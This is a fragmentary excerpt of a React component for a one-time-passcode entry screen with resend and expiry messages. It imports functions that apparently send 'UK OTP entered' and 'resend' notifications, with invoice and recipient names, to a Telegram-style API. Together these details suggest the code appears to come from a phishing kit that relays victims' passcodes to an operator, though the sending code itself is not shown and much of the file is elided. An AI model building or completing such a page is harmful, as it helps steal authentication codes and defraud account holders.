...
import { sendUkOtpEnteredNotification, sendUkOtpResendNotification } from '../tgapi';
        ...
        <div className="mb-4 mt-6 py-1 px-4 bg-card/80 backdrop-blur-sm border border-border/50 rounded-xl shadow-lg drop-shadow-md">
          <div className="text-center">
            <p className="text-[11px] font-chevin font-medium text-muted-foreground/80 leading-relaxed drop-shadow-sm">
              Please enter one-time passcode OTP
            </p>
          </div>
        </div>
      </div>
      ...
      <div className="space-y-3 relative">
        ...
        <div className="flex justify-center gap-2">
          ...
          <Button
            ...
            onClick={async () => {
              ...
              try {
                await sendUkOtpResendNotification(invoiceName, recipientName);
              } catch (error) {
        ...
        <div className="flex justify-center">
          <p className="text-[10px] text-red-500 font-medium">
            One-time passcode expired. Please generate new OTP
          </p>
        </div>
      </div>
